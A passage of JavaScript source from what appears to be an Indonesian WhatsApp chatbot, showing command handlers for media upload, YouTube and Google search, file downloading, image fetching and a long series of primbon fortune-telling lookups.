const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
const anu = await UploadFileUgu(media)
await setReply(anu.url)
} else if (isQuotedSticker) {
onlyWait() 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
const anu = await UploadFileUgu(media)
await setReply(anu.url)
} else setReply(`Use photos/videos or Reply photos/videos/sticker/audio with captions ${prefix + command}`) 
}
break
//=================================================//
case "yts":
try{
if (!text) return setReply(`Example : ${prefix + command} Temola`)
let { data } = await axios.get("https://saipulanuar.ga/api/yt/search?query=" + encodeURI(text)) 
let listSerch = []
for (let x of data.result) {
if (x.type == "video") {
listSerch.push({
title: x.title,
rowId: `${prefix}ytmp3 ${x.url}`,
description: x.description
})
}
}
const sections = [
{title: "Total Search🔍" + data.result.length,
rows: listSerch }]
const listMessage = {
text: `📂Youtube Search`,
buttonText: "Click Here",
sections
}
zyren.sendMessage(m.chat, listMessage, { quoted: m })
} catch {
setReply("Maaf kak fitur sedang error") 
}
break
//=================================================//
case "google": {
if (isBan) return sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} fatih arridho`) 
let google = require("google-it")
google({"query": text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
setReply(teks)
})
}
break
//=================================================//
case "gimage": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} kaori cicak`) 
let gis = require("g-i-s")
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `gimage ${text}`, buttonText: {displayText: "Next Image"}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
footer: copyright,
buttons: buttons,
headerType: 4
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: tzy })
})
}
break
//=================================================//
case "play":
try{
if (!text) return setReply(`Example : ${prefix + command} Temola`)
let { data } = await axios.get("https://saipulanuar.ga/api/yt/search?query=" + encodeURI(text)) 
let listSerch = []
for (let x of data.result) {
if (x.type == "video") {
listSerch.push({
title: x.title,
description: x.description, 
thumbnail: x.thumbnail, 
author: x.author.name, 
views: x.views, 
published: x.ago, 
url: x.url
})
}
}
let result = zyren.pickRandom(listSerch)
let buttons = [
{ buttonId: `${prefix}ytmp3 ${result.url}`, buttonText: { displayText: "audio" }, type: 1 },
{ buttonId: `${prefix}ytmp4 ${result.url}`, buttonText: { displayText: "video" }, type: 1 }]
let teks = "Youtube Play :\n\n"
teks += `⭔ *Title* : ${result.title}\n`
teks += `⭔ *Author* : ${result.author}\n`
teks += `⭔ *Views* : ${result.views}\n`
teks += `⭔ *Published* : ${result.published}\n`
teks += `⭔ *Description* : ${result.description}\n`
zyren.sendMessage(m.chat, { image: { url: result.thumbnail }, caption: teks, buttons: buttons }, { quoted: m }) 
} catch {
setReply("Maaf Kak Fitur Sedang Error") 
}
break
//=================================================//
case "mediafire": 
try{
if (!text) return setReply(`Example : ${prefix + command} https://www.mediafire.com/file/Xxx/PakTzy`)
let { data } = await axios.get("https://saipulanuar.ga/api/download/mediafire-v2?url=" + args[0]) 
let teks = "Mediafire Download :\n\n"
teks += `Name : ${data.result.name}\n`
teks += `Size : ${data.result.size}\n`
teks += `Uploaded : ${data.result.uploaded}\n`
teks += `Link : ${data.result.link}`
setReply(teks)
zyren.sendMediaV2(m.chat, data.result.link, m, { fileName: data.result.name })
} catch {
setReply("Maaf Kak Fitur Sedang Error") 
}
break
//=================================================//
case "ytmp3":
try{
if (!text) return setReply(`Example : ${prefix + command} https://www.youtube.com/watch?v=qhA7r4FJx1wTitle`)
let { data } = await axios.get("https://saipulanuar.ga/api/download/ytmp3?url=" + args[0])
let teks = "Youtube Audio :\n\n"
teks += `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Channel* : ${data.result.channel}\n`
teks += `⭔ *Views* : ${data.result.views}\n`
teks += `⭔ *Published* : ${data.result.published}`
teks += `⭔ *Link* : ${data.result.url}`
zyren.sendMessage(m.chat, { image: { url: data.result.thumb }, caption: teks }, { quoted: m })
zyren.sendMessage(m.chat, { audio: { url: data.result.url }, mimetype: "audio/mp4", fileName: `${data.result.title}.mp3` }, { quoted: m })
} catch {
setReply("Maaf Kak Fitur Sedang Error") 
}
break
//=================================================//
case "ytmp4":
try{
if (!text) return setReply(`Example : ${prefix + command} https://www.youtube.com/watch?v=qhA7r4FJx1wTitle`)
let { data } = await axios.get("https://saipulanuar.ga/api/download/ytmp4?url=" + args[0])
let teks = "Youtube Video :\n\n"
teks += `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Channel* : ${data.result.channel}\n`
teks += `⭔ *Views* : ${data.result.views}\n`
teks += `⭔ *Published* : ${data.result.published}`
zyren.sendMessage(m.chat, { image: { url: data.result.thumb }, caption: teks }, { quoted: m })
zyren.sendMessage(m.chat, { video: { url: data.result.url }, mimetype: "video/mp4", fileName: `${data.result.title}.mp4` }, { quoted: m })
} catch {
setReply("Maaf Kak Fitur Sedang Error") 
}
break
//=================================================//
case "getmusic": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 1`) 
if (!m.quoted) return setReply("Reply Pesan")
if (!m.quoted.isBaileys) return setReply(`Hanya Bisa Membalas Pesan Dari Bot`) 
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, "gi"))
if (!urls) return setReply(`Mungkin pesan yang anda setReply tidak mengandung result ytsearch`) 
let quality = args[1] ? args[1] : "128kbps"
let media = await yta(urls[text - 1], quality)
if (media.filesize >= 100000) return setReply("File Melebihi Batas "+util.format(media))
zyren.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || "128kbps"}`, m)
zyren.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: "audio/mpeg", fileName: `${media.title}.mp3` }, { quoted: tzy })
}
break
//=================================================//
case "getvideo": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!text) return setReply(`Example : ${prefix + command} 1`) 
if (!m.quoted) return setReply("Reply Pesan")
if (!m.quoted.isBaileys) return setReply(`Hanya Bisa Membalas Pesan Dari Bot`) 
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, "gi"))
if (!urls) return setReply(`Mungkin pesan yang anda setReply tidak mengandung result ytsearch`) 
let quality = args[1] ? args[1] : "360p"
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return setReply("File Melebihi Batas "+util.format(media))
zyren.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: "video/mp4", fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || "360p"}` }, { quoted: tzy })
}
break
//=================================================//
case "pinterest": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
zyren.sendMessage(m.chat, { image: { url: result }, caption: "⭔ Media Url : "+result }, { quoted: tzy })
}
break
//=================================================//
case "couple": {
if (isBan) return //sticBanLu(from)
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
let random = anu[Math.floor(Math.random() * anu.length)]
zyren.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: tzy })
zyren.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: tzy })
}
break
//=================================================//
case "coffe": case "kopi": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
let buttons = [
{buttonId: `coffe`, buttonText: {displayText: "Next Image"}, type: 1}
]
let buttonMessage = {
image: { url: "https://coffee.alexflipnote.dev/random" },
caption: `☕ Random Coffe`,
footer: copyright,
buttons: buttons,
headerType: 4
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: tzy })
}
break
//=================================================//
case "wallpaper": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!text) return setReply("Masukkan Query Title") 
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: "Next Image"}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: copyright,
buttons: buttons,
headerType: 4
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: tzy })
}
break
//=================================================//
case "wikimedia": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!text) return setReply("Masukkan Query Title") 
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wikimedia ${text}`, buttonText: {displayText: "Next Image"}, type: 1}
]
let buttonMessage = {
image: { url: result.image },
caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
footer: copyright,
buttons: buttons,
headerType: 4
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: tzy })
}
break
//=================================================//
case "quotesanime": case "quoteanime": {
if (isBan) return //sticBanLu(from)
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `quotesanime`, buttonText: {displayText: "Next"}, type: 1}
]
let buttonMessage = {
text: `~_${result.quotes}_\n\nBy "${result.karakter}", ${result.anime}\n\n- ${result.up_at}`,
footer: copyright,
buttons: buttons,
headerType: 2
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: tzy })
}
break
//=================================================//
case "nomerhoki": case "nomorhoki": {
if (isBan) return //sticBanLu(from)
if (!Number(text)) return setReply(`Example : ${prefix + command} 6288292024190`) 
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//=================================================//
case "artimimpi": case "tafsirmimpi": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} belanja`) 
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case "ramalanjodoh": case "ramaljodoh": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "ramalanjodohbali": case "ramaljodohbali": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "suamiistri": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "ramalancinta": case "ramalcinta": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "artinama": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Raditt`) 
let anu = await primbon.arti_nama(text)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "kecocokannama": case "cocoknama": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case "kecocokanpasangan": case "cocokpasangan": case "pasangan": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit|Mboh`) 
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return setReply(anu.message)
zyren.sendImage(m.chat,anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case "jadianpernikahan": case "jadiannikah": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 6, 12, 2020`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case "sifatusaha": {
if (isBan) return //sticBanLu(from)
if (!ext) return setReply(`Example : ${prefix+ command} 28, 12, 2021`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case "rejeki": case "rezeki": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "pekerjaan": case "kerja": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "ramalannasib": case "ramalnasib": case "nasib": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case "potensipenyakit": case "penyakit": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "artitarot": case "tarot": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "fengshui": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`) 
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case "haribaik": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "harisangar": case "taliwangke": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "harinaas": case "harisial": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case "nagahari": case "harinaga": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "arahrejeki": case "arahrezeki": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "peruntungan": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`) 
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "weton": case "wetonjawa": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case "sifat": case "karakter": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case "keberuntungan": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} Radit, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case "memancing": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 12, 1, 2022`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "masasubur": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`) 
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case "sound1":
case "sound2":
case "sound3":
case "sound4":
case "sound5":
case "sound6":
case "sound7":
case "sound8":
case "sound9":
case "sound10":
case "sound11":
case "sound12":
case "sound13":
case "sound14":
case "sound15":
case "sound16":
case "sound17":
case "sound18":
case "sound19":
case "sound20":
case "sound21":
case "sound22":
case "sound23":
case "sound24":
case "sound25":
case "sound26":
case "sound27":
case "sound28":
case "sound29":
case "sound30":
case "sound31":
case "sound32":
case "sound33":
case "sound34":
case "sound35":
case "sound36":
case "sound37":
case "sound38":
case "sound39":
case "sound40":
case "sound41":
case "sound42":
case "sound43":
case "sound44":
case "sound45":
case "sound46":
case "sound47":
case "sound48":
case "sound49":
case "sound50":
case "sound51":
case "sound52":
case "sound53":
case "sound54":
case "sound55":
case "sound56":
case "sound57":
case "sound58":
case "sound59":
case "sound60":
case "sound61":
case "sound62":
case "sound63":
case "sound64":
case "sound65":
case "sound66":
case "sound67":
case "sound68":
case "sound69":
case "sound70":
case "sound71":
case "sound72":
case "sound73":
case "sound74":
case "sound75":
case "sound76":
case "sound77":
case "sound78":
case "sound79":
case "sound80":
case "sound81":
case "sound82":
case "sound83":
case "sound84":
case "sound85":
case "sound86":
case "sound87":
case "sound88":
case "sound89":
case "sound90":
case "sound91":
case "sound92":
case "sound93":
case "sound94":
case "sound95":
case "sound96":
case "sound97":
case "sound98":
case "sound99":
case "sound100":
case "sound101":
case "sound102":
case "sound103":
case "sound104":
case "sound105":
case "sound106":
case "sound107":
case "sound108":
case "sound109":
case "sound110":
case "sound111":
case "sound112":
case "sound113":
case "sound114":
case "sound115":
case "sound116":
case "sound117":
case "sound118":
case "sound119":
case "sound120":
case "sound121":
case "sound122":
case "sound123":
case "sound124":
case "sound125":
case "sound126":
case "sound127":
